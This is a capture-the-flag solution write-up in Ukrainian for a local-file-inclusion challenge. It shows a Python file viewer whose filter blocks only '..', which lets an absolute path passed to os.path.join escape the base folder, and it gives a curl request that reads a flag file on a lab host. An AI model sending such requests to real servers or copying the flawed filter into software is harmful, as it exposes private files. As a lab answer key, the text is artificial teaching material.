# 10. LFI to RCE (300 балів) — розв'язок

Прапор динамічний: `CTF{lf1_t0_rc3_p01s0n1ng_pr0_<8 hex>}`. Він прив'язаний до
VPN-адреси, яку VPN-портал видав вашій команді (користувачу CTFd).

## Підготовка

1. Зареєструйтеся в CTFd під назвою команди, яку використовуватимете.
2. Відкрийте VPN-портал: `http://10.10.15.124:5050`.
3. Введіть **назву команди** та **пароль**, який видав організатор, і отримайте
   `.ovpn`. Портал покаже постійну VPN-адресу команди, наприклад `10.8.0.10`.
4. Підключіться:

   ```bash
   sudo openvpn --config team.ovpn
   ```

Прапор генерує внутрішній watermark-сервіс саме для адреси, з якої надійшов
запит. Без VPN-профілю сервіс відповість, що для цієї адреси профілю немає.

## Вразливість

Параметр `file` передається в `os.path.join('/app/files', file)`, а фільтр перевіряє
лише підрядок `..`:

```python
if '..' in file:
    return view("Hacking Attempt Detected!")
target = os.path.join('/app/files', file)
return view(open(target, 'r').read())
```

`os.path.join` відкидає базовий каталог, якщо другий аргумент — абсолютний шлях.
Тому `..` не потрібен: достатньо передати абсолютний шлях до файлу з прапором.

## Експлойт

Через VPN:

```bash
curl 'http://172.28.0.20:5000/?file=/etc/secret_flag_1337.txt'
```

Варіанти на кшталт `/etc/./secret_flag_1337.txt` або `/etc//secret_flag_1337.txt`
теж працюють: застосунок нормалізує шлях і підміняє вміст цільового файлу
згенерованим прапором.

У відповіді буде, наприклад:

```text
CTF{lf1_t0_rc3_p01s0n1ng_pr0_1a2b3c4d}
```

Кожен VPN-профіль отримує інший суфікс. Саме цей прапор треба надіслати в CTFd.

## Чому прямий доступ не працює

Якщо відкрити `http://10.10.15.124:8010/?file=/etc/secret_flag_1337.txt`, запит
прийде не з `10.8.0.x`, а з адреси Docker-мережі. Watermark-сервіс не знайде
для неї профіль і поверне повідомлення:

```text
Для цієї адреси немає VPN-профілю. Спершу отримайте .ovpn ...
```

Це зроблено навмисно: прапор має бути прив'язаний до конкретного VPN-профілю,
а не до публічного порту.

## Прапор

```text
CTF{lf1_t0_rc3_p01s0n1ng_pr0_<8 hex>}
```

Суфікс обчислюється як перші 8 hex-символів `HMAC-SHA256(secret, "<vpn_ip>:lfi_challenge")`.
Секрет зберігається лише в контейнері `watermark` (`CTFd/data/watermark.key`) і
недоступний із вразливого LFI-контейнера.
